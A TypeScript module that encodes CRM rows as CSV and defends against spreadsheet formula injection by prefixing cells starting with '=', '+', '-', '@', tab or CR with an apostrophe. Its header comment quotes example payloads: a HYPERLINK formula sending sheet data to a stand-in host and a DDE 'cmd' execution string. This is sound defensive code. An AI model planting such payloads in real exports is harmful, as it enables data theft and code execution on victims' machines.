/**
 * Turning rows into CSV that a spreadsheet will open as data rather than execute as a formula.
 *
 * THE ATTACK THIS PREVENTS. A customer can choose their own WhatsApp display name. If they call
 * themselves `=HYPERLINK("https://evil.test?x="&A1,"Click")` and the owner exports the attention
 * list and opens it in Excel, that cell is a formula the moment the file loads - it can exfiltrate
 * the rest of the sheet, and on older setups `=cmd|'/c calc'!A1` does rather more than that. The
 * CRM never renders that string dangerously, so the vulnerability is created entirely by the
 * export, which makes it the export's job to fix.
 *
 * THE FIX, and why it is this one. Quoting alone does not help: Excel strips the quotes and then
 * evaluates the content. The accepted defence is to prefix any cell whose first character can
 * begin a formula with a single quote, which spreadsheets treat as "the rest is literal text".
 * The leading apostrophe is visible in the cell, which is a small cosmetic cost for a value that
 * was trying to be code.
 *
 * Nothing here knows about conversations. It is a pure encoder so it can be tested exhaustively
 * without a database, which matters because the dangerous cases are all string edge cases.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * `+` and `-` are included even though they are also how a negative number starts - a leading
 * apostrophe on `-12` is harmless, and omitting them would leave `-2+3+cmd|...` live. `@` starts
 * a legacy Lotus-style function, and the tab/CR entries exist because Excel strips leading
 * whitespace before deciding, so ` =1+1` is still a formula.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

const needsFormulaGuard = (value: string): boolean =>
  FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix));

/**
 * One CSV cell: formula-guarded, then quoted per RFC 4180 when it has to be.
 *
 * Null and undefined become an empty cell rather than the strings "null"/"undefined" - a missing
 * assignee is blank in a spreadsheet, not the word null. A Date becomes an ISO 8601 string, which
 * is unambiguous across locales in a way that a formatted date is not.
 */
export const csvCell = (value: unknown): string => {
  if (value === null || value === undefined) {
    return '';
  }

  const raw =
    value instanceof Date
      ? value.toISOString()
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);

  const guarded = needsFormulaGuard(raw) ? `'${raw}` : raw;

  // Quote when the cell contains a delimiter, a quote, or any newline; double any inner quotes.
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
};

export interface CsvColumn<Row> {
  /** The header text. */
  header: string;
  /** Pulls this column's value out of a row. */
  value: (row: Row) => unknown;
}

/**
 * Encodes rows as a CSV document.
 *
 * CRLF line endings and a UTF-8 BOM, both for Excel's benefit: without the BOM it reads the file
 * as the system codepage and mangles any non-ASCII name, which in this CRM is most of them.
 */
export const toCsv = <Row>(rows: readonly Row[], columns: ReadonlyArray<CsvColumn<Row>>): string => {
  const header = columns.map((column) => csvCell(column.header)).join(',');
  const body = rows.map((row) => columns.map((column) => csvCell(column.value(row))).join(','));

  return `\ufeff${[header, ...body].join('\r\n')}\r\n`;
};

/** A filename-safe slug for the Content-Disposition header. */
export const csvFileName = (base: string, isoDate: string): string =>
  `${base.replace(/[^a-z0-9-]/gi, '-').toLowerCase()}-${isoDate.slice(0, 10)}.csv`;
